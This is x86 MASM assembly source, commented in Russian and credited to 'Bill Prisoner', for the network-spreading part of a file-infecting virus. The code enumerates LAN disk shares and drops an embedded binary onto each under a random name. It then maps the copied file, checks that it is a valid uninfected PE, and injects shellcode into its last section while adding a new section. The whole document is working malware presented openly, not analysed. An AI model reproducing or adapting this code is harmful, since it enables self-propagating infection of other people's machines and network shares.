;===============================================================================;
_ResProc proc pNetRes:DWORD,Delta:DWORD
LOCAL hFile:DWORD
LOCAL hMap:DWORD
LOCAL hMapping:DWORD
LOCAL FileSize:DWORD
LOCAL Buffer:DWORD
LOCAL BufferForTempName:DWORD
LOCAL BufferForFileName:DWORD
LOCAL NumberBytes

	jmp CodeResProc
	SlashStr db "\",0
CodeResProc:
	startproc
	mov ebx,Delta
	mov esi,pNetRes
	assume esi:ptr NETRESOURCEA
	push [esi].lpRemoteName
	pop Buffer
;Выделяем буфер
	push ebx
	call AllocBuffer
	.if eax==0
		jmp EndResProc
	.endif
	mov BufferForFileName,eax
;Копируем строку
	push Buffer
	push eax
	apiproc _lstrcpyA
;Добавляем слэш
	lea eax,[ebx+SlashStr]
	push eax
	push BufferForFileName
	apiproc _lstrcatA
;Получаем случайное имя
	push ebx
	call GetRandomFileName
;Сливаем имя с путем
	push eax
	push BufferForFileName
	apiproc _lstrcatA
;Выделяем буффер для пути временного файла
	push ebx
	call AllocBuffer
	.if eax==0
		jmp EndResProc
	.endif
	mov BufferForTempName,eax
;Путь для временного файла
	push eax
	push 255
	apiproc _GetTempPathA
;Получаем полный путь к зараженному файлу
	lea eax,[ebx+TempFile]
	push eax
	push BufferForTempName
	apiproc _lstrcatA
;Создаем файл
	push 0
	push FILE_ATTRIBUTE_NORMAL
	push CREATE_ALWAYS
	push 0
	push FILE_SHARE_READ or FILE_SHARE_WRITE
	push FILE_ALL_ACCESS
	push BufferForTempName
	apiproc _CreateFileA
	.if eax==-1
		jmp EndResProc
	.endif
	mov hFile,eax
;Записываем данные
	push 0
 	lea edx,NumberBytes
	push edx
	push SizeBinData
	lea edx,[ebx+BinData]
	push edx
	push eax
	apiproc _WriteFile
;Закрываем описатель
	push hFile
	apiproc _CloseHandle
;Копируем файл по данному пути
	push TRUE
	push BufferForFileName
	push BufferForTempName
	apiproc _CopyFileA
;Заражаем файл
;Открываем файл
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_WRITE or FILE_SHARE_READ 
	push GENERIC_WRITE or  GENERIC_READ
	push BufferForFileName
	apiproc _CreateFileA
;Проверка на правильность открытия файла
	.if eax==-1
		jmp EndResProc
	.endif
	mov hFile,eax
;Создаем объект "проекция файла"
	push NULL
	push NULL
	push NULL
	push PAGE_READWRITE
	push NULL
	push eax
	apiproc _CreateFileMappingA
;Проверка на правильность создания проекции
	.if eax==0
		jmp EndResProc
	.endif
	mov hMapping,eax
;Проецируем файл на адресное пространство
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push eax	
	apiproc _MapViewOfFile
	.if eax==0
		jmp EndResProc
	.endif
	mov hMap,eax
;Правильный файл?
	push hMap
	call ValidPE
	.if eax==0
		jmp ToInfect3
	.endif
;Закрыть описатель проекции
	push hMapping
	apiproc _CloseHandle
;Не заражен ли уже файл?
	push hMap
	call IsInfect
	.if eax==1
		jmp ToInfect3
	.endif
;Есть ли в файле оверлей?
	push 0
	push hFile
	apiproc _GetFileSize
	mov FileSize,eax

	push hMap
	push FileSize
	call IsOverlay
	.IF eax==1
		jmp ToInfect3
	.ENDIF	
;Заражаем файл
	push ebx
	push ShellCodeLength
	lea eax,[ebx+ShellCode]
	push eax	
	push hMap
	push BufferForFileName
	call InfectExLastSection
;Добавляем пустую секцию
	push ebx
	push hMap
	push BufferForFileName
	call NewSection
ToInfect3:;файл уже заражен или его нельзя заразить
	push hMap
	apiproc _UnmapViewOfFile

	push hFile
	apiproc _CloseHandle 
;Изменяем размер
		push ebx
		push BufferForFileName
		call ChangeFileSize                  
EndResProc:	
	endproc
	ret
_ResProc endp
;===============================================================================;



;===============================================================================;
;Процедура EnumRes proc pNetRes:DWORD,ResProc:DWORD,Delta:DWORD
;Описание: Перечисление ресурсов локальной сети
;	pNetRes - указатель на структуру NETRESOURCE контейнера где искать.
;		Передав NULL поиск идет из корня
;	ResProc - CALLBACK функция, которая имеет следующий прототип
;		_ResProc proc pNetRes:DWORD,Delta:DWORD
;			pNetRes - указатель на NETRESOURCE
;			Delta - дельта-смещение
;	Delta - дельта-смещение
;Autor: Bill Prisoner
;===============================================================================;
EnumRes proc pNetRes:DWORD,ResProc:DWORD,Delta:DWORD
LOCAL hEnum:DWORD
LOCAL Count:DWORD
LOCAL Buffer:DWORD
LOCAL BufferSize:DWORD
	startproc
	mov ebx,Delta
;Начало процесса перечисления
	lea eax,hEnum
	push eax
	push pNetRes
	push 0
	push RESOURCETYPE_ANY
	push RESOURCE_GLOBALNET
	apiproc _WNetOpenEnumA
	.if eax!=NO_ERROR
		jmp EndFunc		
	.endif
;Выделяем буффер
	mov BufferSize,16384
	push PAGE_EXECUTE_READWRITE
	push MEM_RESERVE or MEM_COMMIT
	push BufferSize
	push NULL
	apiproc _VirtualAlloc
	.if eax==NULL
		jmp EndFunc
	.endif
	mov Buffer,eax
;Перечисляем ресурсы
	mov Count,-1

	lea edx,BufferSize
	push edx
	push eax
	lea eax,Count
	push eax
	push hEnum
	apiproc _WNetEnumResourceA
	.if eax!=NO_ERROR
		jmp EndFunc
	.endif
	mov esi,Buffer
	mov ecx,Count
NextEntry:
	push ecx
	assume esi:ptr NETRESOURCEA
	mov eax,[esi].dwUsage
	and eax,RESOURCEUSAGE_CONTAINER
	.if eax==RESOURCEUSAGE_CONTAINER
		push ebx
		push ResProc
		push esi
		call EnumRes
	.elseif
		mov eax,[esi].dwType
		and eax,RESOURCETYPE_DISK
		.if eax==RESOURCETYPE_DISK
			;Проверяем есть ли как минимум 4 зараженных файла на данном ресурсе, если есть, то ничего не копируем
			push ebx
			push [esi].lpRemoteName
			call NumberOfOurFiles
			.if eax<1
				;Копируем на диск файл
				push ebx
				push esi
				call ResProc
			.endif
		.endif
	.endif
	add esi,sizeof NETRESOURCEA
	pop ecx
	loop NextEntry
EndFunc:
;Закрывает описатель перечисления
	push hEnum
	apiproc _WNetCloseEnum
;Освобождаем буфер
	push MEM_RELEASE
	push 0
	push Buffer
	apiproc _VirtualFree
	endproc
	ret
EnumRes endp
;===============================================================================;

;===============================================================================;
;Процедура InfectLocalNetwork proc Delta:DWORD
;Описание: Заражение ресурсов локальной сети
;	Delta - дельта-смещение
;Autor: Bill Prisoner
;===============================================================================;
InfectLocalNetwork proc Delta:DWORD
	startproc
	mov ebx,Delta
	push ebx
	lea eax,[ebx+_ResProc]
	push eax
	push NULL
	call EnumRes
	endproc
	ret
InfectLocalNetwork endp
;===============================================================================;
